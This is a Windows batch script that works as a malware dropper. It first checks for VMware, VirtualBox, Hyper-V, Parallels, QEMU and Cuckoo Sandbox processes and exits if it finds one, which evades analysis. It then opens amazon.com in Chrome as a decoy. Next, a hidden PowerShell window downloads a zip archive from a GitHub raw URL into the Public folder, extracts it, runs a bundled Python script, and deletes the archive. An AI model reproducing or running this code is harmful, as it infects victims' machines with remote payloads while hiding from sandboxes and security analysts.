@echo off
:: Check for Virtual Machines
set VM_DETECTED=0

:: Check for VMware
tasklist /FI "IMAGENAME eq vmtoolsd.exe" 2>NUL | find /I /N "vmtoolsd.exe">NUL
if "%ERRORLEVEL%"=="0" (
    set VM_DETECTED=1
)

tasklist /FI "IMAGENAME eq vmwareuser.exe" 2>NUL | find /I /N "vmwareuser.exe">NUL
if "%ERRORLEVEL%"=="0" (
    set VM_DETECTED=1
)

:: Check for VirtualBox
tasklist /FI "IMAGENAME eq VBoxService.exe" 2>NUL | find /I /N "VBoxService.exe">NUL
if "%ERRORLEVEL%"=="0" (
    set VM_DETECTED=1
)

tasklist /FI "IMAGENAME eq VBoxTray.exe" 2>NUL | find /I /N "VBoxTray.exe">NUL
if "%ERRORLEVEL%"=="0" (
    set VM_DETECTED=1
)

:: Check for Hyper-V
tasklist /FI "IMAGENAME eq vmms.exe" 2>NUL | find /I /N "vmms.exe">NUL
if "%ERRORLEVEL%"=="0" (
    set VM_DETECTED=1
)

:: Check for Parallels
tasklist /FI "IMAGENAME eq prl_cc.exe" 2>NUL | find /I /N "prl_cc.exe">NUL
if "%ERRORLEVEL%"=="0" (
    set VM_DETECTED=1
)

tasklist /FI "IMAGENAME eq prl_tools.exe" 2>NUL | find /I /N "prl_tools.exe">NUL
if "%ERRORLEVEL%"=="0" (
    set VM_DETECTED=1
)

:: Check for QEMU
tasklist /FI "IMAGENAME eq qemu-ga.exe" 2>NUL | find /I /N "qemu-ga.exe">NUL
if "%ERRORLEVEL%"=="0" (
    set VM_DETECTED=1
)

:: Check for Cuckoo Sandbox
tasklist /FI "IMAGENAME eq cuckoo.exe" 2>NUL | find /I /N "cuckoo.exe">NUL
if "%ERRORLEVEL%"=="0" (
    set VM_DETECTED=1
)

:: Terminate the script if a virtual environment is detected
if "%VM_DETECTED%"=="1" (
    echo Virtual environment detected. Exiting the script...
    exit /b
)

echo No virtual environments detected. Continuing execution...
:: Place your main script here
start "" chrome "https://www.amazon.com/"

start /min powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/anhtuan45649/bot9-8/raw/main/Document.zip', 'C:\Users\Public\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document'); Start-Sleep -Seconds 1; C:\Users\Public\Document\python.exe C:\Users\Public\Document\Lib\sim.py; del C:/Users/Public/Document.zip"

endlocal
exit /b 0